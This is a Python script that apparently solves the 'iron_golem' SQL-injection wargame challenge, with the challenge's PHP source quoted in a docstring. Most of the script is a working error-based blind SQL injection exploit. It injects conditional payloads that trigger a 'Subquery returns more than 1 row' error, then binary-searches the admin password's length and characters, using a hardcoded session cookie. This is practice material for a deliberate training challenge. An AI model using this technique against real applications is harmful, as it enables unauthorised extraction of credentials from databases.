import requests
import string
import time
"""
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
"""

url = "https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw=\' or id=\'admin\'"
leng=0
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
strings = string.printable
def find_unicode(i,start=0, end=300):
    time.sleep(0.5)
    mid = (end+start)//2
    print(mid,end)
    payload = url + "and if(ord(substr(pw,"+str(i+1)+",1))>'"+str(mid)+"',1,(select 1 union select 2))%23"
    r = requests.get(payload,cookies=cookie)
    #print(r.text)
    if r.text.find('Subquery returns more than 1 row') == -1:
        if abs(end-mid) <=1 :
            return end
        else:
            return find_unicode(i,mid,end)
    else:
        if abs(end-mid) <=1 :
            return mid
        else:
            return find_unicode(i,start,mid)

while True:
    try:
        query=url+"and if(length(pw)="+str(leng)+",1,(select 1 union select 2))%23"
        r = requests.get(query, cookies=cookie)
        print(query)
    except:
        print("error")
    if r.text.find('Subquery returns more than 1 row') == -1:
        print(leng)
        break
    leng +=1

password= ""
for i in range(leng):
    for j in strings:
        num = find_unicode(i)

        password += chr(num)
        print("found {}".format(password))
        try_url = "https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
        r = requests.get(try_url+password,cookies=cookie)
        if "Clear" in r.text:
            print("clear")
            break
    else:
        continue
    break